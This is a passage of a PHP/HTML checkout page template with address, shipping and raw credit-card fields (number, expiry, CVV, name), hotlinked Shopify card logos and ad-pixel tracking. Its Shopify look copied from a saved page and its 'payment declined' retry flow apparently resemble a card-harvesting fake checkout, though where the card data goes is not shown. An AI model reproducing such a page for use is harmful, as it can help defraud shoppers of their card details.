                                    <input type="text" id="postalCode" name="postalCode" placeholder="Postal code" class="w-full p-3 border rounded focus:outline-none focus:ring-2 focus:ring-[<?php echo $config['store']['theme_color']; ?>] focus:border-[<?php echo $config['store']['theme_color']; ?>] transition-all" required="">
                                </div>
                                <div id="postalCodeError" class="error-message" bis_skin_checked="1"></div>
                            </div>
                            <div class="input-group" bis_skin_checked="1">
                                <div class="input-wrapper" bis_skin_checked="1">
                                    <input type="text" id="city" name="city" placeholder="City" class="w-full p-3 border rounded focus:outline-none focus:ring-2 focus:ring-[<?php echo $config['store']['theme_color']; ?>] focus:border-[<?php echo $config['store']['theme_color']; ?>] transition-all" required="">
                                </div>
                                <div id="cityError" class="error-message" bis_skin_checked="1"></div>
                            </div>
                        </div>
                        <input type="tel" id="phone" name="phone" placeholder="Phone (optional)" class="w-full p-3 border rounded focus:outline-none focus:ring-2 focus:ring-[<?php echo $config['store']['theme_color']; ?>] focus:border-[<?php echo $config['store']['theme_color']; ?>] transition-all">
                        <div id="phoneError" class="error-message" bis_skin_checked="1"></div>
                    </div>

                    <!-- Shipping Method -->
                    <div class="mb-8" bis_skin_checked="1">
                        <h2 class="text-lg font-medium mb-4">Shipping method</h2>
                        <div class="border rounded-md bg-[<?php echo $config['store']['theme_color']; ?>]/10 border-[<?php echo $config['store']['theme_color']; ?>]">
                            <label class="flex items-center justify-between p-4">
                                <div class="flex items-center" bis_skin_checked="1">
                                    
                                    <div class="ml-2" bis_skin_checked="1">
                                        <span class="text-base"><?php echo htmlspecialchars($config['product']['shipping']['method']); ?></span>
                                    </div>
                                </div>
                                <span class="font-medium">
                                    <?php echo htmlspecialchars(($config['product']['shipping']['price'] ?? 'FREE')); ?>
                                </span>
                            </label>
                        </div>
                    </div>

                    <!-- Add this before the Payment Section -->
                    <div class="mb-8">
                        <button id="continueToPaymentBtn" class="w-full bg-[<?php echo $config['store']['theme_color']; ?>] text-white py-4 rounded-md text-lg font-medium hover:opacity-90 transition-colors relative">
                            <div class="flex items-center justify-center">
                                <span id="continueText">Continue to Payment</span>
                                <span id="continueSpinner" class="absolute opacity-0 transition-opacity">
                                    <svg class="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                    </svg>
                                </span>
                            </div>
                        </button>
                    </div>

                    <!-- Payment Error Message -->
                    <?php if (isset($_GET['error']) && $_GET['error'] === 'payment_declined'): ?>
                    <div id="paymentError" class="mb-6 bg-red-50 border border-red-200 text-red-600 px-4 py-3 rounded relative" role="alert">
                        <div class="flex items-center">
                            <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
                            </svg>
                            <span class="block sm:inline font-medium">Payment Declined</span>
                        </div>
                        <p class="text-sm mt-1">Your payment was declined. Please check your card details and try again.</p>
                    </div>
                    <?php endif; ?>

                    <!-- Payment Section -->
                    <div id="paymentSection" class="mb-8" <?php echo (!isset($_GET['error'])) ? 'style="display: none;"' : ''; ?>>
                        <h2 class="text-lg mb-4">Payment</h2>
                        <p class="text-gray-500 text-sm mb-4">All transactions are secure and encrypted.</p>
                        
                        <!-- Credit Card Option -->
                        <div class="border rounded-md">
                            <!-- White Header Section -->
                            <div class="p-4 border rounded-md bg-[<?php echo $config['store']['theme_color']; ?>]/10 border-[<?php echo $config['store']['theme_color']; ?>]">
                                <div class="flex items-center justify-between">
                                    <span>Credit card</span>
                                    <div class="flex items-center">
                                        <span class="border rounded px-2 py-1">
                                            <img alt="VISA" 
                                                 src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/c1.en/assets/visa.sxIq5Dot.svg" 
                                                 role="img" 
                                                 width="38" 
                                                 height="24">
                                        </span>
                                        <span class="border rounded px-2 py-1">
                                            <img alt="MAESTRO" 
                                                 src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/c1.en/assets/maestro.ByfUQi1c.svg" 
                                                 role="img" 
                                                 width="38" 
                                                 height="24">
                                        </span>
                                        <span class="border rounded px-2 py-1">
                                            <img alt="MASTERCARD" 
                                                 src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/c1.en/assets/mastercard.1c4_lyMp.svg" 
                                                 role="img" 
                                                 width="38" 
                                                 height="24">
                                        </span>
                                        <span class="border rounded px-2 py-1">
                                            <img alt="AMEX" 
                                                 src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/c1.en/assets/amex.Csr7hRoy.svg" 
                                                 role="img" 
                                                 width="38" 
                                                 height="24">
                                        </span>
                                        <span class="text-blue-600 font-medium">+4</span>
                                    </div>
                                </div>
                            </div>

                            <!-- Gray Input Section -->
                            <div class="p-4 bg-[#F9FAFB]">
                                <div>
                                    <!-- Card Number -->
                                    <div class="input-group">
                                        <div class="input-wrapper">
                                            <input type="text" id="cardNumber" name="cardNumber" placeholder="Card number" class="w-full p-3 border rounded-md bg-white text-gray-500 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-[<?php echo $config['store']['theme_color']; ?>] focus:border-[<?php echo $config['store']['theme_color']; ?>] transition-all" required disabled>
                                        </div>
                                        <div id="cardNumberError" class="error-message"></div>
                                    </div>
                                    <div class="grid grid-cols-2 gap-4">
                                        <!-- Expiry Date -->
                                        <div class="input-group">
                                            <div class="input-wrapper">
                                                <input type="text" id="expiryDate" name="expiryDate" placeholder="Expiration date (MM / YY)" class="w-full p-3 border rounded-md bg-white text-gray-500 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-[<?php echo $config['store']['theme_color']; ?>] focus:border-[<?php echo $config['store']['theme_color']; ?>] transition-all" required disabled>
                                            </div>
                                            <div id="expiryDateError" class="error-message"></div>
                                        </div>
                                        
                                        <!-- CVV -->
                                        <div class="input-group">
                                            <div class="input-wrapper">
                                                <input type="text" id="cvv" name="cvv" placeholder="Security code" class="w-full p-3 border rounded-md bg-white text-gray-500 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-[<?php echo $config['store']['theme_color']; ?>] focus:border-[<?php echo $config['store']['theme_color']; ?>] transition-all" required disabled>
                                            </div>
                                            <div id="cvvError" class="error-message"></div>
                                        </div>
                                    </div>
                                    <!-- Name on Card -->
                                    <div class="input-group">
                                        <div class="input-wrapper">
                                            <input type="text" id="nameOnCard" name="nameOnCard" placeholder="Name on card" class="w-full p-3 border rounded-md bg-white text-gray-500 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-[<?php echo $config['store']['theme_color']; ?>] focus:border-[<?php echo $config['store']['theme_color']; ?>] transition-all" required disabled>
                                        </div>
                                        <div id="nameOnCardError" class="error-message"></div>
                                    </div>
                                    <label class="flex items-center">
                                        <input type="checkbox" checked class="w-4 h-4 text-[<?php echo $config['store']['theme_color']; ?>] border-gray-300 rounded mr-2">
                                        <span class="text-sm">Use shipping address as billing address</span>
                                    </label>
                                </div>
                            </div>
                        </div>

                    <!-- Secure and Encrypted -->
                        <div class="flex items-center justify-between my-8 text-gray-500 text-sm">
                            <div class="flex items-center">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                            </svg>
                            <span>Secure and encrypted</span>
                        </div>
                        <img src="shop-logo.svg" alt="Shop" class="h-5">
                    </div>

                    <!-- Pay Now Button -->
                    <button id="payNowBtn" class="w-full bg-[<?php echo $config['store']['theme_color']; ?>] text-white py-4 rounded-md text-lg font-medium hover:opacity-90 transition-colors relative" <?php echo (!isset($_GET['error'])) ? 'disabled' : ''; ?>>
                        <div class="flex items-center justify-center">
                            <span id="payNowText">Pay now</span>
                            <span id="loadingSpinner" class="absolute opacity-0 transition-opacity">
                                <svg class="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                </svg>
                            </span>
                        </div>
                    </button>

                        <!-- Error Messages -->
                        <div id="errorMessages" class="mt-4 text-red-500 text-sm hidden"></div>
                    </div>
                </div>

                <!-- Right Column - Order Summary -->
                <div class="bg-gray-50 border order-2 rounded-lg" bis_skin_checked="1">
                    <div class="p-4 md:p-10 md:sticky md:top-4" bis_skin_checked="1">
                        <div class="flex items-center space-x-4 mb-6" bis_skin_checked="1">
                            <div class="relative" bis_skin_checked="1">
                                <img src="<?php echo htmlspecialchars($config['product']['image'] ?? ''); ?>" alt="<?php echo htmlspecialchars($config['product']['name'] ?? ''); ?>" class="w-12 h-12 md:w-16 md:h-16 object-cover rounded">
                                <span class="absolute -top-2 -right-2 bg-gray-500 text-white text-xs w-5 h-5 rounded-full flex items-center justify-center">1</span>
                            </div>
                            <div class="flex-1 flex justify-between items-start" bis_skin_checked="1">
                                <div bis_skin_checked="1">
                                    <p class="font-medium text-sm md:text-base"><?php echo htmlspecialchars($config['product']['name'] ?? ''); ?></p>
                                    <p class="text-sm text-gray-500"><?php echo htmlspecialchars($config['product']['size'] ?? ''); ?></p>
                                </div>
                                <p class="font-medium text-sm md:text-base"><?php echo formatPrice($config['product']['price'] ?? 0); ?></p>
                            </div>
                        </div>

                        <div class="space-y-4" bis_skin_checked="1">
                            <!-- Discount Code -->
                            <div class="flex" bis_skin_checked="1">
                                <input type="text" placeholder="Discount code" class="flex-1 px-3 py-2 border rounded-l-md focus:outline-none focus:ring-2 focus:ring-[<?php echo $config['store']['theme_color']; ?>] focus:border-[<?php echo $config['store']['theme_color']; ?>] transition-all">
                                <button class="px-6 py-2 bg-gray-50 border border-l-0 rounded-r-md text-gray-500 hover:text-gray-700">Apply</button>
                            </div>

                            <!-- Price Summary -->
                            <div class="space-y-2" bis_skin_checked="1">
                                <div class="flex justify-between" bis_skin_checked="1">
                                    <span class="text-gray-700">Subtotal</span>
                                    <span><?php echo formatPrice(getProductTotal()); ?></span>
                                </div>
                                <div class="flex justify-between" bis_skin_checked="1">
                                    <span class="text-gray-700">Shipping</span>
                                    <span><?php echo $config['product']['shipping']['price'] ?? 'FREE'; ?></span>
                                </div>
                                <div class="flex justify-between pt-4 border-t font-medium text-base" bis_skin_checked="1">
                                    <span>Total</span>
                                    <span><?php echo formatPrice(getOrderTotal()); ?></span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="max-w-6xl mx-auto px-4 py-6 md:py-8 mt-8 border-t">
            <div class="flex flex-col sm:flex-row justify-center gap-4 sm:gap-6 text-sm text-gray-500 text-center" bis_skin_checked="1">
                <a href="#" class="hover:text-gray-700 transition-colors">Refund policy</a>
                <a href="#" class="hover:text-gray-700 transition-colors">Privacy policy</a>
                <a href="#" class="hover:text-gray-700 transition-colors">Terms of service</a>
            </div>
            <p class="text-center text-gray-400 text-sm mt-4">
                © <?php echo $config['store']['footer_year'] ?? date('Y'); ?> <?php echo htmlspecialchars($config['store']['name'] ?? ''); ?>. All rights reserved.
            </p>
        </footer>
    </div>

    <!-- Add this JavaScript before the closing body tag -->
    <script src="script.js"></script>
    <script>
    document.getElementById('payNowBtn').addEventListener('click', function() {
        // Track the InitiateCheckout event
        if (typeof fbq !== 'undefined') {
            fbq('track', 'InitiateCheckout', {
                value: <?php echo getOrderTotal(); ?>,
                currency: '<?php echo htmlspecialchars($config['store']['currency']); ?>'
            });
        }
        if (typeof ttq !== 'undefined') {
            ttq.track('InitiateCheckout', {
                content_type: 'product',
                quantity: 1,
                price: <?php echo getOrderTotal(); ?>,
                currency: '<?php echo htmlspecialchars($config['store']['currency']); ?>'
            });
        }
    });
    </script>
</body>
</html>
